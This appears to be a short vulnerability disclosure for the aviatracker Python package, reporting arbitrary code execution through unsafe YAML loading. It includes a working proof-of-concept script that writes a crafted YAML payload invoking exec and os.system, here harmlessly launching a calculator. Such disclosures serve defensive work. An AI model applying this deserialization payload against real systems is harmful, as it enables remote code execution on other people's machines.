# Description

`aviatracker.io` is a service, providing real-time access to air traffic data, package is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

```python
import os

os.system('git clone https://github.com/tunalagoona/aviatracker.git')
os.chdir('aviatracker/')
if not os.path.exists('config/'):
        os.mkdir('config/')

payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""

open('config/config.yaml','w+').write(payload)
os.system('python3 flighttracker/config.py')
```
* `python3 exploit.py`


# Impact

Arbitary Code Execution
